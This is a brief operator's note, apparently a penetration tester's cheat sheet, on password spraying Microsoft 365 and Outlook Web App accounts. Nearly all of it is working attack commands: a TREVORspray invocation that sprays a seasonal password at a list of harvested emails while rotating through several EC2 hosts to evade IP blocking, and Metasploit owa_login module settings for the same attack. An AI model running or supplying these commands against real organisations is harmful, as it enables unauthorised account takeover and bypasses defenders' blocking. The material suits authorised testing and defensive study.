---
title: Password Spraying
updated: 2023-11-02 10:00:11Z
created: 2023-11-02 09:37:48Z
latitude: -33.86881970
longitude: 151.20929550
altitude: 0.0000
---

# Password Spraying
IMPORTANT: Make sure you understand the **Password Lockout Policy** before spraying. Log an Alert for lockout events.

## O365
### TREVORspray
Need to bypass blocking IP addresses. SSH proxy into multiple EC2 hosts: 
`./trevorspray.py -e /opt/trevorspray/log/valid_emails.txt --passwords 'Winter2023!' --delay 15 --no-current-ip --ssh ubuntu@EC2_IP1 ubuntu@EC2_IP2 ubuntu@EC2_IP3 ubuntu@EC2_IP4 -k hacking.pem`

## Outlook Web App
### Metasploit
`search owa`
`use auxiliary/scanner/http/owa_login`
`options`
`set password Winter2023!`
`set user_file email_list.txt` 
`set threads 10`